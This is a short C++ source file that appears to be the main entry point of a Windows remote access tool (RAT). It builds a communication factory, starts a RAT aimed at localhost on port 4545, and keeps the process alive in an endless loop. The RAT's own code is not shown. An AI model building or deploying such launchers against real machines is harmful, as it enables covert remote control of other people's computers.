#include <Windows.h>

#include "ICommunicationFactory.h"
#include "IRat.h"

int main()
{
	const auto factory = std::shared_ptr<ICommunicationFactory>(CreateFactory().release());

	const auto rat = CreateRat(
		factory,
		"localhost", 
		4545);

	//MSG Msg; // msg object to be processed, but actually never is processed
	//while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	//{
	//	TranslateMessage(&Msg);
	//	DispatchMessage(&Msg);
	//}
	while (true)
	{
		
	}

	return 0;
}
